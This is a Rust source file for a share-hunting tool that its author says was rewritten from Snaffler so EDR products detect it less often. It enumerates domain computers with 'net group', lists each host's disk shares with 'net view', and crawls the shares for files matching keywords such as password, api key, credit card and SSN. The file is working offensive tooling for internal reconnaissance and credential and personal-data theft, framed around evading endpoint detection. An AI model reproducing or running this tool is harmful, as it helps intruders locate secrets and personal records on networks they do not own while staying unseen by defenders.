/*
Author: Kevin (Kaged Pyro) Gunter
Purpose: I got tired of snaffler getting caught, so I rewrote it in rust, which edrs have trouble detecting.

*/
use clap::Parser;
use std::fmt::Debug;
use std::fs;
use std::fs::read_to_string;
use std::fs::OpenOptions;
use std::io::Write;
use std::ops::Index;
use std::path::PathBuf;
use std::process::exit;
use std::process::Command;
use std::thread;
use std::time::Duration;
use tokio;
use tokio::sync::mpsc::{channel, Sender, Receiver};
use colored::Colorize;

#[derive(Parser, Debug)]
#[command(version, about, long_about = Some("finds shares, but its written in rust which sometimes gets past EDR!"))]
struct Args{
    #[arg(short, long, help = "path to save output file Defaults to not saving output.")]
    outfile: Option<PathBuf>,

    #[arg(short, long, help = "number of threads to use, default to 10. \nNote thre thread count will be doubled, one set for share finder tasks, and one set for file and infor finding tasks.")]
    threads: Option<usize>,

    #[arg(short, long, help = "specific targets. should be comma separated.")]
    targets: Option<String>,
}

struct ShareFinder{
    id: usize,
    tx: Sender<Message>,
}

#[derive(Clone)]
struct Message{
    source: MessageType,
    destination: MessageType,
    content: String,
}

#[derive(Clone, PartialEq)]
enum MessageType{
    ShareMessage,
    InfoMessage,
    ControlMessage,
}


async fn find_shares(task: ShareFinder, mut rx: Receiver<Message>){
    println!("{} share task started!", task.id);
    let ping_recv = rx.recv().await;
    if ping_recv.is_some(){
        let message = Message{source: MessageType::ShareMessage, destination: MessageType::ControlMessage, content: String::from("pong!")};
        task.tx.send(message).await.unwrap();
    }
    loop{
        if rx.capacity() == 0{
            println!("rx is full for share finder {}", task.id);
        }
        let rx_res = rx.recv().await;
        if rx_res.is_some(){
            let computer = rx_res.unwrap().content;
            if computer == String::from("||DONE||"){
                let message = Message{source: MessageType::ShareMessage, destination: MessageType::ControlMessage, content: format!("{}:||DONE||", task.id)};
                task.tx.send(message).await.unwrap();
                break;
            }
            println!("scanning {}", computer);
            let share_list_res = Command::new("net").arg("view").arg(computer.clone()).arg("/all").output();
            let mut error_string = String::new();
            let mut success_string = String::new();
            if share_list_res.is_ok(){
                let output = share_list_res.unwrap();
                if output.stdout.len() > 0{
                    success_string = String::from_utf8_lossy(&output.stdout).to_string();
                }

                if output.stderr.len() > 0{
                    error_string = String::from_utf8_lossy(&output.stderr).to_string();
                }
            }
            else{
                error_string = share_list_res.err().unwrap().to_string();
            }
            if error_string.len() > 0{
                eprintln!("{}", "Error listing shares!".red());
                eprint!("{}", error_string.red());
            }
            else if success_string.len() > 0{
                for line in success_string.lines(){
                    if line.contains("Disk"){
                        let share_name = line.split_whitespace().collect::<Vec<&str>>()[0];
                        let share_path = format!("\\\\{}\\{}", computer, share_name);
                        let message = Message{source: MessageType::ShareMessage, destination: MessageType::InfoMessage, content: format!("{}:{}", task.id, share_path)};
                        task.tx.send(message).await.unwrap();
                    }
                }
            }
        }
    }
}

async fn find_info(task: ShareFinder, mut rx: Receiver<Message>){
    println!("{} file task started!", task.id);
    let ping_recv = rx.recv().await;
    if ping_recv.is_some(){
        let message = Message{source: MessageType::ShareMessage, destination: MessageType::ControlMessage, content: String::from("pong!")};
        task.tx.send(message).await.unwrap();
    }
    let files_to_read = vec![
            ".txt",
            ".ini",
            ".xml",
            ".json",
            ".config",
            ".conf",
            ".bat",
            ".cmd",
            ".sql",
            ".ps1",
            ".py",
            ".vbscript"
        ];

    let interesting_info = vec![
        "password",
        "pass",
        "user",
        "api",
        "key",
        "credit card",
        "cc",
        "ssn",
        "social Security",
        "tax",
        "i9",
        "it",
        "identified",
        "username",
    ];
    loop{
        let rx_res = rx.recv().await;
        if rx_res.is_some(){
            let message = rx_res.unwrap();
            let message_vec: Vec<&str> = message.content.split(":").collect();
            let path = message_vec[1];
            if path.contains("||DONE||"){
                let done_message = Message{source: MessageType::InfoMessage, destination: MessageType::ControlMessage, content: format!("{}:||DONE||", task.id)};
                task.tx.send(done_message).await.unwrap();
            }
            for entry_res in walkdir::WalkDir::new(path){
                if entry_res.is_ok(){
                    let entry = entry_res.unwrap();
                    let file_path = entry.into_path();
                    let mut file_name = String::new();
                    let mut file_content = String::new();
                    if file_path.file_name().is_some(){
                        file_name = file_path.file_name().unwrap().to_string_lossy().to_string();
                    }
                    for extension in &files_to_read{
                        if file_name.contains(extension){
                            let file_content_res = read_to_string(&file_path);
                            if file_content_res.is_ok(){
                                file_content = file_content_res.unwrap();
                            }
                        }
                    }
                    for thing in &interesting_info{
                        if file_name.contains(thing) || file_content.contains(thing){
                            let message = Message{source: MessageType::InfoMessage, destination: MessageType::ControlMessage, content: format!("{}:Keyword match at {}", task.id, file_path.display())};
                            task.tx.send(message).await.unwrap();
                        }
                        else{
                            let message = Message{source: MessageType::InfoMessage, destination: MessageType::ControlMessage, content: format!("{}:file found at {}", task.id, file_path.display())};
                            task.tx.send(message).await.unwrap();
                        }
                    }
                }
            }
        }
    }
}



#[tokio::main]
async fn main(){
    let args = Args::parse();
    let mut outfile = PathBuf::new();
    let mut file_threads = 1;
    let mut share_threads = 1;
    let mut save = false;
    let mut computers = Vec::new();
    if args.outfile.is_some(){
        outfile = args.outfile.unwrap();
        save = true;
    }
    if args.threads.is_some(){
        let threads = args.threads.unwrap() / 2;
        file_threads = threads;
        share_threads = threads;
    }
    if args.targets.is_some(){
        println!("gathering the targets you gave me.");
        let targets = args.targets.unwrap();
        if targets.contains(","){
            let split_targets: Vec<&str> = targets.split(",").collect();
            for target in split_targets{
                computers.push(target.to_string());
            }
        }
        else{
            computers.push(targets);
        }
    }
    else{
        println!("no targets given, proceeding with domain computer enumeration...");
        println!("finding computers...");
        let command_string = String::from("net group \"domain computers\" /domain");
        let mut temp_file = fs::File::create("./temp.bat").unwrap();
        write!(temp_file, "{}", command_string).unwrap();
        let computer_res = Command::new(".\\temp.bat").output();
        let mut error_string = String::new();
        let mut success_string = String::new();
        fs::remove_file("./temp.bat").unwrap();
        if computer_res.is_ok(){
            let output = computer_res.unwrap();
            if output.stdout.len() > 0{
                success_string = String::from_utf8_lossy(&output.stdout).to_string();
            }
            else if output.stderr.len() > 0{
                error_string = String::from_utf8_lossy(&output.stderr).to_string();
            }
        }
        else{
            error_string = computer_res.err().unwrap().to_string();
        }
        if error_string.len() > 0{
            eprintln!("{}", "error getting computers!".red());
            eprintln!("{}", error_string.red());
            exit(1);
        }
        if success_string.len() > 0{
            for line in success_string.lines(){
                if line.contains("$"){
                    let words:Vec<&str> = line.split_whitespace().collect();
                    for word in words{
                        let mut computer_name = word.to_string();
                        computer_name.pop();
                        println!("{} {}", "found".green(), computer_name.green());
                        computers.push(computer_name);
                    }
                }
            }
        }
    }
    if share_threads > computers.len(){
        share_threads = computers.len();
        //file_threads = computers.len();
    }
    let mut share_handles = Vec::new();
    let mut file_handles = Vec::new();
    println!("computer enumeration finished, starting task finder threads...");
    let (maintx, mut mainrx) = channel(1024);
    let mut share_tasks = Vec::new();
    let mut share_txes = Vec::new();
    let mut file_tasks = Vec::new();
    let mut file_txes = Vec::new(); 
    for id in 0..share_threads{
        println!("starting share task {}...", id);
        let (share_tx,share_rx) = channel(1);
        let new_share_task = ShareFinder{id, tx: maintx.clone()};
        share_handles.push(tokio::spawn(find_shares(new_share_task, share_rx)));
        share_tasks.push(id);
        share_txes.push(share_tx.clone());
        let ping_message = Message{source: MessageType::ControlMessage, destination: MessageType::ShareMessage, content: String::from("ping!")};
        share_tx.send(ping_message).await.unwrap();
        loop{
            let rx_recv = mainrx.recv().await;
            if rx_recv.is_some(){
                let message = rx_recv.unwrap();
                if message.content == String::from("pong!"){
                    println!("{} ready!", id);
                    break;
                }
            }
            println!("didn't recieve file pong from {}", id);
        }
    }
    for id in 0..file_threads{
        println!("starting file task {}...", id);
         let (file_tx, file_rx) = channel(1);
         let new_file_task = ShareFinder{id, tx: maintx.clone()};
         file_handles.push(tokio::spawn(find_info(new_file_task, file_rx)));
         file_tasks.push(id);
         file_txes.push(file_tx.clone());
         let ping_message = Message{source: MessageType::ControlMessage, destination: MessageType::ShareMessage, content: String::from("ping!")};
         file_tx.send(ping_message).await.unwrap();
         loop{
            let rx_recv = mainrx.recv().await;
            if rx_recv.is_some(){
                let message = rx_recv.unwrap();
                if message.content == String::from("pong!"){
                    println!("{} ready!", id);
                    break;
                }
            }
            println!("didn't recieve file pong from {}", id);
        }
    }
    let mut current_computer = 0;
    let mut shares_finished = false;
    let mut files_finished = false;
    let mut file_buffer = Vec::new();
    let mut finished_counter = 0;
    let mut empty_counter = 0;
    let mut handled_lines = Vec::new();
    loop {
        if files_finished && shares_finished{
            exit(0);
        }
        if !mainrx.is_empty(){
            finished_counter = 0;
            empty_counter = 0;
            let rx_res = mainrx.recv().await;
            if rx_res.is_some(){
                let message = rx_res.unwrap();
                match message.destination{
                    MessageType::ControlMessage => {
                        let message_vec: Vec<&str> = message.content.split(":").collect();
                        let _id = message_vec[0];
                        let message_content = message_vec[1].to_string();
                        match message_content{
                            _ => {
                                if !handled_lines.contains(&message_content){
                                    if save{
                                        let open_res = OpenOptions::new().append(true).create(true).open(&outfile);
                                        if open_res.is_ok(){
                                            let mut file = open_res.unwrap();
                                            let write_res = write!(file, "{}\n", message_content);
                                            if write_res.is_err(){
                                                eprintln!("{}", "error writing to outfile!".red());
                                                eprintln!("{}", write_res.err().unwrap().to_string().red());
                                            }
                                        }
                                    }
                                    println!("{}", message_content.green());
                                    handled_lines.push(message_content);
                                }

                            }
                        } 
                    }
                    MessageType::InfoMessage => {
                        file_buffer.push(message.content);
                    }
                    MessageType::ShareMessage => {}
                }
            }
        }
        let mut sent = false;
        if !shares_finished{
            for tx in &share_txes{
                if tx.capacity() > 0{
                    let message = Message{source: MessageType::ShareMessage, destination: MessageType::ShareMessage, content: computers[current_computer].clone()};
                    tx.send(message).await.unwrap();
                    sent = true;
                    break;
                }
            }
            if sent{
                current_computer +=1;
                if current_computer == computers.len() {
                    shares_finished = true;
                }
            }
        }
        if shares_finished{
            if file_buffer.len() == 0{
                empty_counter += 1;
                println!("empty counter: {}", empty_counter);
            }
            if empty_counter >= 100{
                finished_counter +=1;
                println!("finished counter: {}", finished_counter);
                thread::sleep(Duration::from_millis(50));
            }
        }
        if file_buffer.len() > 0{
            let mut sent_index = Vec::new();
            empty_counter = 0;
            finished_counter = 0;
            let mut current_tx = 0;
            for index in 0 .. file_buffer.len() - 1{
                let mut sent = false;
                let message = Message{source: MessageType::ControlMessage, destination: MessageType::InfoMessage, content: file_buffer[index].clone()};
                if file_txes[current_tx].capacity()> 0{
                    file_txes[current_tx].send(message).await.unwrap();
                    sent = true;
                }
                else{
                    current_tx += 1;
                    if current_tx == file_txes.len(){
                        current_tx = 0;
                    }
                }
                if sent{
                    sent_index.push(index);
                }
            }
            for index in sent_index{
                file_buffer.remove(index);
            }
        }
        if finished_counter == 10{
            files_finished = true;
        }
    }
}